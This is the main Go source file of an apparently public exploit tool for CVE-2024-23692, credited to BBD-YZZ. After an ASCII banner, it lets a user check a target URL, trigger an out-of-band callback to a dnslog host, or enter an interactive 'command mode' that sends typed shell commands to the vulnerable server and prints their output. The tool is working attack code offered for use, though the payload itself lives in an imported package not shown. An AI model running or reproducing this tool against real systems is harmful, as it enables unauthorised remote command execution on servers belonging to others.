package main

import (
	"CVE-2024-23692/cve"
	"CVE-2024-23692/tools"
	"fmt"
	"strings"
)

func banner() {
	str := `+================================================================================================================+
+                                                                                                                +
+  ██████ ██    ██ ███████       ██████   ██████  ██████  ██   ██       ██████  ██████   ██████   █████  ██████  + 
+ ██      ██    ██ ██                 ██ ██  ████      ██ ██   ██            ██      ██ ██       ██   ██      ██ + 
+ ██      ██    ██ █████   █████  █████  ██ ██ ██  █████  ███████ █████  █████   █████  ███████   ██████  █████  + 
+ ██       ██  ██  ██            ██      ████  ██ ██           ██       ██           ██ ██    ██      ██ ██      +
+  ██████   ████   ███████       ███████  ██████  ███████      ██       ███████ ██████   ██████   █████  ███████ +
+                                                                                                                +
+ Github: https://github.com/BBD-YZZ/CVE-2024-23692               Auth:BBD-YZZ            Time:2024-06-17        + 
+================================================================================================================+`
	fmt.Println(str)
}

func excute() {
	url, proxy, dnslog, command, dns := tools.Parse()
	if url == "" {
		tools.PrintUsageAndExit()
		return
	}
	exp := cve.NewCVE202423962(url, proxy)
	switch {
	case !command && !dns:
		exp.Check()
	case command && !dns:
		fmt.Println("[+] Entering command mode. Type [exit/quit] to exit.")
		for {
			fmt.Print("command-> ")
			text, err := tools.ReadCommand()
			if err != nil {
				fmt.Println("Error reading input:", err)
				continue
			}
			if text == "exit" || text == "quit" {
				fmt.Println("Exiting command mode!")
				break
			}
			// result := exp.Exploit(strings.Replace(text, " ", "+", -1))
			result := exp.Exploit(strings.ReplaceAll(text, " ", "+"))
			fmt.Println(result)
		}
	case !command && dns:
		if dnslog == "" {
			exp.Dnslog("")
		} else {
			exp.Dnslog(dnslog)
		}

	default:
		tools.PrintUsageAndExit()
	}
}

func main() {
	banner()
	excute()
}
